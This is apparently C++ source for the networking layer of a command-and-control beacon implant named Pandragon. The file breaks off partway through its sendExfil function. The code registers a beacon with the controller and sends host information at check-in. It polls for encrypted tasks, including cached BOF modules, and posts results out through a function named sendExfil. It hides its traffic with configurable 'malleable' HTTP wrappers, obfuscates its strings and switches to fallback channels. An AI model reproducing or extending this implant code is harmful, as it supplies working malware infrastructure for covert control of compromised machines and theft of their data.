#include "../../include/network/net_abstract.h"
#include "../../include/network/net_internal.h"
#include "../../include/resolver.h"
#include "../../include/network/transport.h"
#include "../../libs/bastia/bastia.h"
#include "../../include/utils.h"
#include "../../include/config_parser.h"
#include "../../include/pandragon_runtime.h"
#include "../../include/coff/COFFSetup.h"
#include <cstdint>
#include <utility>
#include <cstring>
#include <winsock.h>

static RequestDirection g_request_direction = RequestDirection::POLL;

void setRequestDirection(RequestDirection dir) { g_request_direction = dir; }
RequestDirection getRequestDirection(void) { return g_request_direction; }

// -- Shared network state ------------------------------------------------
NetworkState g_state;

// -- Helper: Get next sequence number with automatic increment --------------
// Returns current seq_num and automatically increments it (call on every send)
static uint32_t getNextSeqNum() {    
    // Trigger key rotation when approaching wraparound (16 packets before)
    if (g_state.seq_num >= 0xFFFFFFF0) {
        g_state.key_rotation_pending = true;
        c_debugPrint(g_state.nt, "[getNextSeqNum] Approaching wraparound (seq=%lu), key rotation pending", 
                     (unsigned long)g_state.seq_num);
    }
    
    g_state.seq_num++;
    
    // Handle actual wraparound
    if (g_state.seq_num == 0) {
        // Wrapped to 0 - this should not happen if key rotation works
        // Force to 1 and ensure key rotation is triggered
        g_state.seq_num = 1;
        g_state.key_rotation_pending = true;
        c_debugPrint(g_state.nt, "[getNextSeqNum] Sequence number WRAPPED - key rotation REQUIRED");
    }
    
    return g_state.seq_num;
}

// Check if key rotation is pending (called from main loop)
bool isKeyRotationPending(void) {
    return g_state.key_rotation_pending;
}

// Clear key rotation pending flag (called after successful rotation)
void clearKeyRotationPending(void) {
    g_state.key_rotation_pending = false;
    g_state.seq_num = 1;  // Reset sequence number after key rotation
    c_debugPrint(g_state.nt, "[clearKeyRotationPending] Key rotation complete, seq_num reset to 1");
}

// -- Function to set beacon identity --------------------------------
void setBeaconIdentity(const uint8_t* beaconID, const uint8_t* cryptoKey) {
    if (beaconID) {
        if (!g_state.beacon_id) g_state.beacon_id = (uint8_t*)__malloc(8);
        if (g_state.beacon_id) __memcpy(g_state.beacon_id, beaconID, 8);
    }
    if (cryptoKey) {
        if (!g_state.crypto_key) g_state.crypto_key = (uint8_t*)__malloc(32);
        if (g_state.crypto_key) __memcpy(g_state.crypto_key, cryptoKey, 32);
    }
    // Only mark identity as set if both buffers are valid
    g_state.identity_set = (g_state.beacon_id != nullptr) && (g_state.crypto_key != nullptr);
}

bool initNetworkTable(functionTable* ntFt) {
    if (!ntFt) return false;
    g_state.nt = ntFt;
    return true;
}

// Set channel security mode (HTTPS vs HTTP)
void setChannelSecure(bool isHttps) {
    g_state.is_https = isHttps;
}

// Get channel security mode
bool isChannelSecure(void) {
    return g_state.is_https;
}

// Set SSL certificate validation mode (true = validate, false = ignore errors)
void setValidateSSL(bool validate) {
    g_state.validate_ssl = validate;
}

void initNetwork(functionTable* ntFt,
                const wchar_t*   host,
                const wchar_t*   pollPath,
                const wchar_t*   submitPath,
                const wchar_t* userAgent,
                INTERNET_PORT    port)
{
    // Free existing allocations
    if (g_state.host) { __free(g_state.host); g_state.host = nullptr; }
    if (g_state.poll_path) { __free(g_state.poll_path); g_state.poll_path = nullptr; }
    if (g_state.submit_path) { __free(g_state.submit_path); g_state.submit_path = nullptr; }
    if (g_state.userAgent) { __free(g_state.userAgent); g_state.userAgent = nullptr; }

    // Allocate and copy strings
    if (host) {
        size_t len = __wcslen(host) + 1;
        g_state.host = (wchar_t*)__malloc(len * sizeof(wchar_t));
        if (g_state.host) __memcpy(g_state.host, host, len * sizeof(wchar_t));
    }

    if (pollPath) {
        size_t len = __wcslen(pollPath) + 1;
        g_state.poll_path = (wchar_t*)__malloc(len * sizeof(wchar_t));
        if (g_state.poll_path) __memcpy(g_state.poll_path, pollPath, len * sizeof(wchar_t));
    }

    if (submitPath) {
        size_t len = __wcslen(submitPath) + 1;
        g_state.submit_path = (wchar_t*)__malloc(len * sizeof(wchar_t));
        if (g_state.submit_path) __memcpy(g_state.submit_path, submitPath, len * sizeof(wchar_t));
    }

    if (userAgent) {
        size_t len = __wcslen(userAgent) + 1;
        g_state.userAgent = (wchar_t*)__malloc(len * sizeof(wchar_t));
        if (g_state.userAgent) __memcpy(g_state.userAgent, userAgent, len * sizeof(wchar_t));
    }

    // Store port
    g_state.port = port ? port : INTERNET_DEFAULT_HTTPS_PORT;
    g_state.nt = ntFt;
}

// -- switchChannel -----------------------------------------------------
// Switch to a different C2 channel (for failover)
bool switchChannel(const wchar_t* host,
                   const wchar_t* pollPath,
                   const wchar_t* submitPath,
                   const wchar_t* userAgent,
                   INTERNET_PORT    port)
{
    if (!host || !pollPath || !submitPath || !userAgent) {
        c_debugPrint(g_state.nt, "[switchChannel] NULL parameters");
        return false;
    }

    // Free existing and allocate new
    if (g_state.host) { __free(g_state.host); g_state.host = nullptr; }
    if (g_state.poll_path) { __free(g_state.poll_path); g_state.poll_path = nullptr; }
    if (g_state.submit_path) { __free(g_state.submit_path); g_state.submit_path = nullptr; }
    if (g_state.userAgent) { __free(g_state.userAgent); g_state.userAgent = nullptr; }

    // Clear stale malleable config from previous channel
    clearMalleableConfig();

    size_t len = __wcslen(host) + 1;
    g_state.host = (wchar_t*)__malloc(len * sizeof(wchar_t));
    if (!g_state.host) return false;
    __memcpy(g_state.host, host, len * sizeof(wchar_t));

    len = __wcslen(pollPath) + 1;
    g_state.poll_path = (wchar_t*)__malloc(len * sizeof(wchar_t));
    if (!g_state.poll_path) { __free(g_state.host); g_state.host = nullptr; return false; }
    __memcpy(g_state.poll_path, pollPath, len * sizeof(wchar_t));

    len = __wcslen(submitPath) + 1;
    g_state.submit_path = (wchar_t*)__malloc(len * sizeof(wchar_t));
    if (!g_state.submit_path) {
        __free(g_state.host); g_state.host = nullptr;
        __free(g_state.poll_path); g_state.poll_path = nullptr;
        return false;
    }
    __memcpy(g_state.submit_path, submitPath, len * sizeof(wchar_t));

    len = __wcslen(userAgent) + 1;
    g_state.userAgent = (wchar_t*)__malloc(len * sizeof(wchar_t));
    if (!g_state.userAgent) {
        __free(g_state.host); g_state.host = nullptr;
        __free(g_state.poll_path); g_state.poll_path = nullptr;
        __free(g_state.submit_path); g_state.submit_path = nullptr;
        return false;
    }
    __memcpy(g_state.userAgent, userAgent, len * sizeof(wchar_t));

    // Store port
    g_state.port = port;

    c_debugPrint(g_state.nt, "[switchChannel] Switched to %ls:%d poll=%ls submit=%ls", host, port, pollPath, submitPath);
    return true;
}

// -- Helper: get system uptime in milliseconds ---------------------------
// Uses NtQuerySystemInformation(SystemTimeOfDayInformation) to compute
// (CurrentTime - BootTime) / 10000. Returns 0 on failure (server treats
// 0 as unknown boot state, no reset triggered).
static uint64_t getUptimeMs(functionTable* nt) {
    uint8_t info[16] = {0};
    ULONG retLen = 0;
    NTSTATUS status = nt->NtQuerySystemInformation(
        3, info, sizeof(info), &retLen
    );
    if (status != 0 || retLen < 16) {
        c_debugPrint(nt, "[getUptimeMs] NtQuerySystemInformation failed: 0x%lx", (unsigned long)status);
        return 0;
    }
    uint64_t bootTime = *(uint64_t*)info;
    uint64_t curTime  = *(uint64_t*)(info + 8);
    // Both are FILETIME (100ns intervals since Jan 1, 1601)
    uint64_t diff100ns = curTime - bootTime;
    return diff100ns / 10000ULL;
}

// -- sendCheckin -----------------------------------------------------
// Send initial check-in with BEACON_CHECK_IN opcode
// Payload format: [uptime_ms:8][sysinfo...]  (uptime for reboot detection)
bool sendCheckin(const char* sysinfo, size_t sysinfo_len) {
    c_VERBOSE(g_state.nt, "[sendCheckin] ENTER: g_state.nt=%p, g_state.identity_set=%d, sysinfo=%p, sysinfo_len=%zu",
                 (void*)g_state.nt, (int)g_state.identity_set, (const void*)sysinfo, sysinfo_len);
    
    if (!g_state.nt || !g_state.identity_set) {
        c_debugPrint(g_state.nt, "[sendCheckin] Early return: g_state.nt=%p, g_state.identity_set=%d", (void*)g_state.nt, (int)g_state.identity_set);
        return false;
    }

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(g_state.nt, nonce)) {
        c_debugPrint(g_state.nt, "[sendCheckin] CSPRNG failed - aborting packet\n");
        return false;
    }

    // Query uptime for reboot detection
    uint64_t uptime_ms = getUptimeMs(g_state.nt);

    // Build payload: [uptime_ms:8][sysinfo...]
    size_t payload_len = sizeof(uptime_ms) + sysinfo_len;
    uint8_t* payload = (uint8_t*)__malloc(payload_len);
    if (!payload) {
        c_debugPrint(g_state.nt, "[sendCheckin] malloc failed for payload\n");
        return false;
    }
    __memcpy(payload, &uptime_ms, sizeof(uptime_ms));
    if (sysinfo && sysinfo_len > 0) {
        __memcpy(payload + sizeof(uptime_ms), sysinfo, sysinfo_len);
    }

    c_debugPrint(g_state.nt, "[sendCheckin] Serializing check-in packet (uptime=%llu)...",
                 (unsigned long long)uptime_ms);
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_state.beacon_id,
        pandragon::b2s_opcode::BEACON_CHECK_IN,
        getNextSeqNum(),
        nonce,
        payload,
        payload_len,
        g_state.crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    __free(payload);

    if (packet_result.first == pandragon::parse_err::OK) {
        c_VERBOSE(g_state.nt, "[sendCheckin] Packet serialized: %zu bytes, sending via sendExfil...", packet_result.second.second);
        bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
        c_VERBOSE(g_state.nt, "[sendCheckin] sendExfil returned: %d", (int)result);
        __free(packet_result.second.first);
        return result;
    }

    c_debugPrint(g_state.nt, "[sendCheckin] serializePacket failed: %d", (int)packet_result.first);
    return false;
}

// -- Helpers ------------------------------------------------

// ASCII upcast: only valid for base64/URL-safe output (all < 128).
static wchar_t* asciiToWide(const char* narrow, size_t len) {
    wchar_t* wide = (wchar_t*)__malloc((len + 1) * sizeof(wchar_t));
    if (!wide) return NULL;
    for (size_t i = 0; i < len; i++) wide[i] = (wchar_t)(unsigned char)narrow[i];
    wide[len] = L'\0';
    return wide;
}

// -- URL-safe base64 encoder (RFC 4648, no padding) ---------------------
// '+' -> '-', '/' -> '_', trailing '=' stripped.
// Returns heap-alloc'd null-terminated string; caller must __free().
char* b64UrlEncode(const unsigned char* src, size_t srcLen) {
    if (!src || srcLen == 0) return NULL;

    static const char* tbl =
        lcg_encrypt("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_");

    size_t outLen = 4 * ((srcLen + 2) / 3) + 1;
    char*  out    = (char*)__malloc(outLen);
    if (!out) return NULL;

    size_t i = 0, j = 0;
    while (i + 2 < srcLen) {
        out[j++] = tbl[(src[i]              >> 2) & 0x3F];
        out[j++] = tbl[((src[i]   << 4) | (src[i+1] >> 4)) & 0x3F];
        out[j++] = tbl[((src[i+1] << 2) | (src[i+2] >> 6)) & 0x3F];
        out[j++] = tbl[ src[i+2]                             & 0x3F];
        i += 3;
    }
    if (srcLen - i == 2) {
        out[j++] = tbl[(src[i]              >> 2) & 0x3F];
        out[j++] = tbl[((src[i]   << 4) | (src[i+1] >> 4)) & 0x3F];
        out[j++] = tbl[(src[i+1]  << 2)           & 0x3F];
    } else if (srcLen - i == 1) {
        out[j++] = tbl[(src[i] >> 2) & 0x3F];
        out[j++] = tbl[(src[i] << 4) & 0x3F];
    }
    out[j] = '\0';
    return out;
}

// -- URL-safe base64 decoder ------------------------------------------------
// Decodes base64url (with or without padding) to binary.
// Returns heap-alloc'd buffer; caller must __free(). Sets *outLen on success.
unsigned char* b64UrlDecode(const char* src, size_t srcLen, size_t* outLen) {
    if (!src || srcLen == 0 || !outLen) {
        if (outLen) *outLen = 0;
        return NULL;
    }

    // Build reverse lookup table
    static unsigned char tbl[256];
    static bool initialized = false;
    if (!initialized) {
        // Mark all characters as invalid (0xFF sentinel)
        for (int i = 0; i < 256; i++) tbl[i] = 0xFF;
        for (int i = 0; i < 64; i++) {
            char c = lcg_encrypt("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")[i];
            tbl[(unsigned char)c] = i;
        }
        initialized = true;
    }

    // Calculate output size with correct formula
    // Base64: 4 chars -> 3 bytes
    // Formula: outSize = (srcLen * 3 + 3) / 4, then subtract padding
    size_t pad = 0;
    if (srcLen >= 2 && src[srcLen-2] == '=') pad = 2;
    else if (srcLen >= 1 && src[srcLen-1] == '=') pad = 1;

    size_t effectiveLen = srcLen - pad;
    size_t outSize = (effectiveLen * 3 + 3) / 4;
    
    // Sanity check: output should never be larger than input
    if (outSize > srcLen) {
        *outLen = 0;
        return NULL;
    }

    unsigned char* out = (unsigned char*)__malloc(outSize + 1);
    if (!out) {
        *outLen = 0;
        return NULL;
    }

    size_t i = 0, j = 0;
    while (i + 4 <= srcLen && src[i] != '=') {
        unsigned char a = tbl[(unsigned char)src[i]];
        unsigned char b = tbl[(unsigned char)src[i+1]];
        unsigned char c = (src[i+2] == '=') ? 0 : tbl[(unsigned char)src[i+2]];
        unsigned char d = (src[i+3] == '=') ? 0 : tbl[(unsigned char)src[i+3]];
        
        // Reject if any character is not in the base64 alphabet
        if (a == 0xFF || b == 0xFF ||
            (src[i+2] != '=' && c == 0xFF) ||
            (src[i+3] != '=' && d == 0xFF)) {
            __free(out);
            *outLen = 0;
            return NULL;
        }

        out[j++] = (a << 2) | (b >> 4);
        if (src[i+2] != '=') out[j++] = (b << 4) | (c >> 2);
        if (src[i+3] != '=') out[j++] = (c << 6) | d;
        i += 4;
    }
    
    // Handle remaining characters
    size_t rem = srcLen - i;
    if (rem == 2) {
        unsigned char a = tbl[(unsigned char)src[i]];
        unsigned char b = tbl[(unsigned char)src[i+1]];
        out[j++] = (a << 2) | (b >> 4);
    } else if (rem == 3) {
        unsigned char a = tbl[(unsigned char)src[i]];
        unsigned char b = tbl[(unsigned char)src[i+1]];
        unsigned char c = tbl[(unsigned char)src[i+2]];
        out[j++] = (a << 2) | (b >> 4);
        out[j++] = (b << 4) | (c >> 2);
    }
    
    *outLen = j;
    return out;
}

// Builds L"<basePath>?<wideQuery>" into a single heap buffer.
// Returns NULL if inputs are too large (bounds check for persistence).
static wchar_t* buildQueryPath(const wchar_t* basePath, const wchar_t* query) {
    size_t   bLen = __wcslen(basePath);
    size_t   qLen = __wcslen(query);
    
    // Bounds check: reject paths > 10KB (prevents integer overflow on malloc)
    if (bLen > 10000 || qLen > 10000) {
        return NULL;
    }
    
    wchar_t* buf  = (wchar_t*)__malloc((bLen + 1 + qLen + 1) * sizeof(wchar_t));
    if (!buf) return NULL;
    size_t i = 0;
    for (size_t k = 0; k < bLen;  k++) buf[i++] = basePath[k];
    buf[i++] = L'?';
    for (size_t k = 0; k < qLen;  k++) buf[i++] = query[k];
    buf[i] = L'\0';
    return buf;
}

// -- Public API -------------------------------------

bool sendData(const char* content, uint32_t flags) {
    if (!g_state.nt || !content) return false;
    c_debugPrint(g_state.nt, "Sending content (as string:) %s", content);

    // If encryption is not disabled, use packet format
    if (!(flags & static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT))) {
        // Generate cryptographically secure random nonce for this packet
        uint8_t nonce[24] = {0};
        if (!generateSecureNonce(g_state.nt, nonce)) {
            // CRITICAL: CSPRNG failure - cannot safely continue
            c_debugPrint(g_state.nt, "[sendContent] CSPRNG failed - aborting packet\n");
            return false;
        }

        // Serialize the packet with encryption
        PandragonRuntime& runtime = PandragonRuntime::getInstance();
        auto packet_result = pandragon::serializePacket(
            g_state.beacon_id,
            pandragon::b2s_opcode::BEACON_TASK_RESULT,  // Default opcode for content
            getNextSeqNum(),
            nonce,
            reinterpret_cast<const uint8_t*>(content),
            __strlen(content),
            g_state.crypto_key,
            runtime.getConfig().options.pad,
            runtime.getConfig().pad_max
        );

        if (packet_result.first == pandragon::parse_err::OK) {
            // Send the complete packet to configured submit endpoint
            bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
            // Clean up allocated packet buffer
            __free(packet_result.second.first);
            return result;
        }
    }

    // Encryption requested but serialization failed - do NOT send plaintext
    return false;
}

bool sendData(const void* content, size_t contentLen,
              uint32_t flags)
{
    if (!g_state.nt || !content || contentLen == 0) return false;
    // If encryption is not disabled, use packet format
    if (!(flags & static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT))) {
        // Generate cryptographically secure random nonce for this packet
        uint8_t nonce[24] = {0};
        if (!generateSecureNonce(g_state.nt, nonce)) {
            // CRITICAL: CSPRNG failure - cannot safely continue
            c_debugPrint(g_state.nt, "[sendFileChunk] CSPRNG failed - aborting packet\n");
            return false;
        }

        // Serialize the packet with encryption
        PandragonRuntime& runtime = PandragonRuntime::getInstance();
        auto packet_result = pandragon::serializePacket(
            g_state.beacon_id,
            pandragon::b2s_opcode::BEACON_TASK_RESULT,  // Default opcode for content
            getNextSeqNum(),
            nonce,
            static_cast<const uint8_t*>(content),
            contentLen,
            g_state.crypto_key,
            runtime.getConfig().options.pad,
            runtime.getConfig().pad_max
        );

        if (packet_result.first == pandragon::parse_err::OK) {
            // Send the complete packet to configured submit endpoint
            bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
            // Clean up allocated packet buffer
            __free(packet_result.second.first);
            return result;
        }
    }

    // Encryption requested but serialization failed - do NOT send plaintext
    return false;
}

std::pair<void*, size_t> getMessage(void) {
    c_debugPrint(g_state.nt, "[getMessage] ENTER: g_state.nt=%p, g_state.identity_set=%d", (void*)g_state.nt, (int)g_state.identity_set);
    if (!g_state.nt || !g_state.identity_set) {
        c_debugPrint(g_state.nt, "[getMessage] Early return: g_state.nt=%p, g_state.identity_set=%d", (void*)g_state.nt, (int)g_state.identity_set);
        return { nullptr, 0 };
    }

    // Generate cryptographically secure random nonce for poll request
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(g_state.nt, nonce)) {
        c_debugPrint(g_state.nt, "[getMessage] CSPRNG failed - aborting poll\n");
        return { nullptr, 0 };
    }

    c_debugPrint(g_state.nt, "[getMessage] Serializing poll packet...");

    size_t cached_bof_len = 0;
    uint8_t* cached_bof_data = BofCacheManager::instance().gatherCachedBofIds(&cached_bof_len);

    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_state.beacon_id,
        pandragon::b2s_opcode::BEACON_POLL,
        getNextSeqNum(),
        nonce,
        cached_bof_data,
        cached_bof_len,
        g_state.crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    if (cached_bof_data) {
        __free(cached_bof_data);
    }

    if (packet_result.first != pandragon::parse_err::OK) {
        c_debugPrint(g_state.nt, "[getMessage] serializePacket failed: %d", (int)packet_result.first);
        return { nullptr, 0 };
    }

    c_debugPrint(g_state.nt, "[getMessage] Packet serialized: %zu bytes", packet_result.second.second);

    // TCP transport: skip base64 encoding, send raw packet bytes directly
    uint8_t* raw_packet = packet_result.second.first;
    size_t raw_packet_len = packet_result.second.second;

    if (isTcpTransport()) {
        auto res = getTransport()(g_state.nt, g_state.host, g_state.poll_path, g_state.userAgent, g_state.port, raw_packet, raw_packet_len);
        __free(raw_packet);

        if (!res.first || res.second == 0) {
            return { nullptr, 0 };
        }

        c_VERBOSE(g_state.nt, "Poll sent (TCP) - seq_num incremented to %lu", (unsigned long)g_state.seq_num);

        // Response is raw packet bytes from server; deserialize directly
        using namespace pandragon;

        c_VERBOSE(g_state.nt, "Decoding %zu bytes from server (TCP)\n", res.second);

        auto [parse_result, parsed] = pandragon::deserializePacket(
            static_cast<const uint8_t*>(res.first),
            res.second,
            g_state.crypto_key,
            true
        );
        __free(res.first);

        if (parse_result != parse_err::OK) {
            c_debugPrint(g_state.nt, "deserializePacket failed: %d", (int)parse_result);
            return { nullptr, 0 };
        }

        if (__memcmp(parsed.beacon_id, g_state.beacon_id, 8) != 0) {
            c_debugPrint(g_state.nt, "Beacon ID mismatch (TCP)\n");
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            return { nullptr, 0 };
        }

        c_debugPrint(g_state.nt, "Decrypted (TCP): opcode=0x%02x len=%zu\n", parsed.opcode, parsed.decrypted_len);

        size_t total_len = parsed.decrypted_len + 1;
        uint8_t* result = (uint8_t*)__malloc(total_len);
        if (!result) {
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            return { nullptr, 0 };
        }
        result[0] = parsed.opcode;
        if (parsed.decrypted_payload && parsed.decrypted_len > 0) {
            __memcpy(result + 1, parsed.decrypted_payload, parsed.decrypted_len);
        }
        if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
        return { result, total_len };
    }

    // HTTP path: encode to base64, apply POLL wrapper, send via GET
    char* b64 = b64UrlEncode(packet_result.second.first, packet_result.second.second);
    __free(raw_packet);

    if (!b64) return { nullptr, 0 };

    // Apply poll wrapper if configured (prefix + suffix)
    const char* pollPrefix = getPollWrapperPrefix();
    const char* pollSuffix = getPollWrapperSuffix();
    size_t pollPrefixLen = __strlen(pollPrefix);
    size_t pollSuffixLen = __strlen(pollSuffix);
    char* expanded_prefix = NULL;
    char* expanded_suffix = NULL;

    if (pollPrefixLen > 0) {
        expanded_prefix = expandMacros(pollPrefix);
    }
    if (pollSuffixLen > 0) {
        expanded_suffix = expandMacros(pollSuffix);
    }

    char* wrapped = NULL;
    if (expanded_prefix || expanded_suffix) {
        size_t prefix_len = expanded_prefix ? __strlen(expanded_prefix) : 0;
        size_t suffix_len = expanded_suffix ? __strlen(expanded_suffix) : 0;
        size_t b64_len = __strlen(b64);
        size_t wrapped_len = prefix_len + b64_len + suffix_len + 1;
        wrapped = (char*)__malloc(wrapped_len);
        if (wrapped) {
            wrapped[0] = '\0';
            if (prefix_len > 0) {
                __memcpy(wrapped, expanded_prefix, prefix_len);
            }
            __memcpy(wrapped + prefix_len, b64, b64_len);
            if (suffix_len > 0) {
                __memcpy(wrapped + prefix_len + b64_len, expanded_suffix, suffix_len);
            }
            wrapped[wrapped_len - 1] = '\0';
            __free(b64);
            b64 = wrapped;
        }
        if (expanded_prefix) __free(expanded_prefix);
        if (expanded_suffix) __free(expanded_suffix);
    }

    // Poll always uses GET — build path with query string using POLL malleable config
    wchar_t* full_path = NULL;
    size_t b64_len = __strlen(b64);

    if (getPollPayloadLocationType() == PCFG_LOCATION_TYPE::PATH) {
        const char* pathPrefix = getPollPathPrefix();
        const char* pathSuffix = getPollPathSuffix();
        size_t pathPrefixLen = __strlen(pathPrefix);
        size_t pathSuffixLen = __strlen(pathSuffix);
        wchar_t* wPrefix = asciiToWide(pathPrefix, pathPrefixLen);
        wchar_t* wSuffix = asciiToWide(pathSuffix, pathSuffixLen);
        wchar_t* wB64 = asciiToWide(b64, b64_len);

        size_t pathLen = __wcslen(g_state.poll_path);

        full_path = (wchar_t*)__malloc((pathLen + pathPrefixLen + b64_len + pathSuffixLen + 1) * sizeof(wchar_t));
        if (full_path) {
            full_path[0] = L'\0';
            for (size_t i = 0; i < pathLen; i++) full_path[i] = g_state.poll_path[i];
            if (wPrefix) {
                for (size_t i = 0; i < pathPrefixLen; i++) full_path[pathLen + i] = wPrefix[i];
            }
            for (size_t i = 0; i < b64_len; i++) full_path[pathLen + pathPrefixLen + i] = (wchar_t)b64[i];
            if (wSuffix) {
                for (size_t i = 0; i < pathSuffixLen; i++) full_path[pathLen + pathPrefixLen + b64_len + i] = wSuffix[i];
            }
            full_path[pathLen + pathPrefixLen + b64_len + pathSuffixLen] = L'\0';
        }
        if (wPrefix) __free(wPrefix);
        if (wSuffix) __free(wSuffix);
        __free(wB64);
    } else {
        wchar_t* wB64 = asciiToWide(b64, b64_len);
        if (!wB64) {
            __free(b64);
            return { nullptr, 0 };
        }

        const char* payloadParamName = getPollPayloadParamName();
        size_t payloadParamNameLen = __strlen(payloadParamName);
        if (payloadParamNameLen > 0) {
            wchar_t* paramName = asciiToWide(payloadParamName, payloadParamNameLen);
            full_path = buildQueryPath(g_state.poll_path, paramName);
            if (full_path) {
                size_t pathLen = __wcslen(full_path);
                size_t extraLen = b64_len + 1;
                wchar_t* newPath = (wchar_t*)__malloc((pathLen + extraLen + 1) * sizeof(wchar_t));
                if (newPath) {
                    for (size_t i = 0; i < pathLen; i++) newPath[i] = full_path[i];
                    newPath[pathLen] = L'=';
                    for (size_t i = 0; i < b64_len; i++) newPath[pathLen + 1 + i] = wB64[i];
                    newPath[pathLen + extraLen] = L'\0';
                    __free(full_path);
                    full_path = newPath;
                }
            }
            if (paramName) __free(paramName);
        } else {
            full_path = buildQueryPath(g_state.poll_path, wB64);
        }
        __free(wB64);
    }

    __free(b64);
    if (!full_path) return { nullptr, 0 };

    setRequestDirection(RequestDirection::POLL);
    auto res = getTransport()(g_state.nt, g_state.host, full_path, g_state.userAgent, g_state.port, NULL, 0);
    __free(full_path);

    if (!res.first || res.second == 0) {
        return { nullptr, 0 };
    }

    c_VERBOSE(g_state.nt, "Poll sent (GET) - seq_num=%lu", (unsigned long)g_state.seq_num);

    // Unwrap server response using POLL-response wrapper
    size_t unwrapped_len = 0;
    const char* unwrapped = unwrapPollResponseBuffer(
        static_cast<const char*>(res.first), res.second, &unwrapped_len);
    if (!unwrapped || unwrapped_len == 0) {
        __free(res.first);
        return { nullptr, 0 };
    }

    size_t decoded_len = 0;
    unsigned char* decoded = b64UrlDecode(unwrapped, unwrapped_len, &decoded_len);
    __free(res.first);

    if (!decoded || decoded_len == 0) {
        if (decoded) __free(decoded);
        return { nullptr, 0 };
    }

    using namespace pandragon;

    c_VERBOSE(g_state.nt, "Decoding %zu bytes from server\n", decoded_len);

    #ifdef DEBUG
        if (decoded_len >= 46) {
            uint32_t magic = *(uint32_t*)decoded;
            uint8_t version = decoded[4];
            uint32_t payload_len_field = *(uint32_t*)(decoded + 42);
            c_VERBOSE(g_state.nt, "Header: magic=0x%08x ver=%u payload_len=%u\n",
                        (unsigned)magic, (unsigned)version, (unsigned)payload_len_field);
            c_VERBOSE(g_state.nt, "Available payload space: %zu bytes\n", decoded_len - 46);
            (void)magic; (void)version; (void)payload_len_field;
        }
    #endif

    auto [parse_result, parsed] = pandragon::deserializePacket(
        static_cast<const uint8_t*>(decoded),
        decoded_len,
        g_state.crypto_key,
        true
    );

    c_VERBOSE(g_state.nt, "deserializePacket returned: %u\n", (uint8_t)parse_result);

    if (parse_result == parse_err::OK) {
        if (__memcmp(parsed.beacon_id, g_state.beacon_id, 8) != 0) {
            c_debugPrint(g_state.nt, "Beacon ID mismatch\n");
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            __free(decoded);
            return { nullptr, 0 };
        }

        c_debugPrint(g_state.nt, "Decrypted: opcode=0x%02x len=%zu\n", parsed.opcode, parsed.decrypted_len);

        size_t total_len = parsed.decrypted_len + 1;
        uint8_t* result = (uint8_t*)__malloc(total_len);
        if (!result) {
            if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
            __free(decoded);
            return { nullptr, 0 };
        }
        result[0] = parsed.opcode;
        if (parsed.decrypted_payload && parsed.decrypted_len > 0) {
            __memcpy(result + 1, parsed.decrypted_payload, parsed.decrypted_len);
        }
        if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
        __free(decoded);
        c_VERBOSE(g_state.nt, "Returning %zu bytes (opcode=0x%02x)\n", total_len, result[0]);
        return { result, total_len };
    } else {
        c_debugPrint(g_state.nt, "deserializePacket returned a value other than OK. Cannot proceed with this packet.");
    }

    if (parsed.decrypted_payload) __free(parsed.decrypted_payload);
    __free(decoded);
    return { nullptr, 0 };
}

// ============================================================================
// sendExfil Helpers
// ============================================================================

static char* applySubmitMalleableWrapper(const char* b64Payload) {
    if (!b64Payload) return nullptr;

    const char* submitPrefix = getSubmitWrapperPrefix();
    const char* submitSuffix = getSubmitWrapperSuffix();
    size_t submitPrefixLen = __strlen(submitPrefix);
    size_t submitSuffixLen = __strlen(submitSuffix);
    char* expanded_prefix = nullptr;
    char* expanded_suffix = nullptr;

    if (submitPrefixLen > 0) {
        expanded_prefix = expandMacros(submitPrefix);
    }
    if (submitSuffixLen > 0) {
        expanded_suffix = expandMacros(submitSuffix);
    }

    if (!expanded_prefix && !expanded_suffix) {
        return nullptr;
    }

    size_t prefix_len = expanded_prefix ? __strlen(expanded_prefix) : 0;
    size_t suffix_len = expanded_suffix ? __strlen(expanded_suffix) : 0;
    size_t b64_len = __strlen(b64Payload);
    size_t wrapped_len = prefix_len + b64_len + suffix_len + 1;

    char* wrapped = (char*)__malloc(wrapped_len);
    if (!wrapped) {
        if (expanded_prefix) __free(expanded_prefix);
        if (expanded_suffix) __free(expanded_suffix);
        return nullptr;
    }

    wrapped[0] = '\0';
    if (prefix_len > 0) __memcpy(wrapped, expanded_prefix, prefix_len);
    __memcpy(wrapped + prefix_len, b64Payload, b64_len);
    if (suffix_len > 0) __memcpy(wrapped + prefix_len + b64_len, expanded_suffix, suffix_len);
    wrapped[wrapped_len - 1] = '\0';

    if (expanded_prefix) __free(expanded_prefix);
    if (expanded_suffix) __free(expanded_suffix);

    return wrapped;
}

// ============================================================================
// sendExfil - Always POST to submit_path
// ============================================================================

bool sendExfil(const void* content, size_t contentLen, const wchar_t* targetPath) {
    if (!g_state.nt || !content || contentLen == 0) {
        c_debugPrint(g_state.nt, "[sendExfil] Early return: g_state.nt=%p, content=%p, contentLen=%zu",
                     (void*)g_state.nt, (const void*)content, contentLen);
        return false;
    }

    if (!targetPath || __wcslen(targetPath) == 0) {
        targetPath = g_state.submit_path;
    }
    if (!targetPath) {
        return false;
    }
    c_VERBOSE(g_state.nt, "[sendExfil] ENTER: g_state.nt=%p, content=%p, contentLen=%zu, submitPath=%ls",
                 (void*)g_state.nt, (const void*)content, contentLen, targetPath ? targetPath : L"(null)");

    // TCP transport: send raw bytes directly, skip base64
